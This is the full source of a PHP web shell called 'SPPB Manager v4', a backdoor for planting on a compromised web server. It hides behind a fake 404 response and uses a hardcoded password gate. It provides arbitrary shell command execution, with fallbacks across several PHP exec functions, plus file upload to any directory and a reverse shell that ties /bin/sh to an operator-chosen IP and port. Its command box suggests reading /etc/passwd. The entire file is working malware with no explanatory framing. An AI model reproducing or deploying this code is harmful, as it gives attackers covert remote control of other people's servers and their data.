<?php
error_reporting(0);@set_time_limit(0);@ini_set('memory_limit','512M');
$p='51d4203cdf';
if(!isset($_COOKIE['j'])||$_COOKIE['j']!==md5($p.$_SERVER['HTTP_USER_AGENT'])){
    if(isset($_POST['p'])&&md5($_POST['p'])===md5($p)){setcookie('j',md5($p.$_SERVER['HTTP_USER_AGENT']),time()+3600);}
    elseif(isset($_GET['a'])&&$_GET['a']===$p){setcookie('j',md5($p.$_SERVER['HTTP_USER_AGENT']),time()+3600);}
    else{header('HTTP/1.0 404 Not Found');exit('404');}
}
if(isset($_FILES['f'])&&isset($_POST['u'])){
    $t=basename($_FILES['f']['name']);if(isset($_POST['d']))$t=$_POST['d'].'/'.$t;
    if(move_uploaded_file($_FILES['f']['tmp_name'],$t))echo"[+] Uploaded: $t";else echo"[-] Failed";exit;
}
if(isset($_GET['c'])||isset($_POST['c'])){
    $c=isset($_GET['c'])?$_GET['c']:$_POST['c'];echo"<pre>";
    if(function_exists('exec')){exec($c,$o);echo htmlspecialchars(implode("\n",$o));}
    elseif(function_exists('shell_exec'))echo htmlspecialchars(shell_exec($c));
    elseif(function_exists('passthru')){ob_start();passthru($c);echo htmlspecialchars(ob_get_clean());}
    elseif(is_resource($f=popen($c,'r'))){echo htmlspecialchars(stream_get_contents($f));pclose($f);}
    else echo"[-] No exec function";echo"</pre>";exit;
}
if(isset($_GET['r'])){list($ip,$po)=explode(':',$_GET['r']);$s=fsockopen($ip,$po);if($s){$d=array(0=>$s,1=>$s,2=>$s);proc_open('/bin/sh -i',$d,$pp);}exit;}
echo '<!DOCTYPE html><html><head><title>SPPB Manager</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;color:#0f0;font-family:monospace;font-size:12px;padding:10px}
.h{background:#111;padding:10px;margin-bottom:10px;border:1px solid #333}
.s{margin:8px 0;padding:8px;border:1px solid #333;background:#111}
input{background:#111;color:#0f0;border:1px solid #333;padding:4px 6px;font-family:monospace;font-size:11px}
input[type="submit"]{background:#1a3a1a;cursor:pointer}pre{background:#000;padding:8px;max-height:400px;overflow:auto}
</style></head><body>
<div class="h"><h1>SPPB Manager v4</h1>'.php_uname().' | '.get_current_user().' | PHP '.phpversion().'</div>
<div class="s"><h3>Command Execution</h3><form method="get"><input type="text" name="c" size="60" placeholder="id;ls -la;cat /etc/passwd"><input type="hidden" name="a" value="'.$p.'"><input type="submit" value="Execute"></form></div>
<div class="s"><h3>File Upload</h3><form method="post" enctype="multipart/form-data"><input type="file" name="f"><input type="hidden" name="u" value="1"><input type="submit" value="Upload"></form></div>
<div class="s"><h3>Reverse Shell</h3><form method="get"><input type="text" name="r" placeholder="YOUR_IP:PORT" size="25"><input type="hidden" name="a" value="'.$p.'"><input type="submit" value="Connect"></form></div>
</body></html>';?>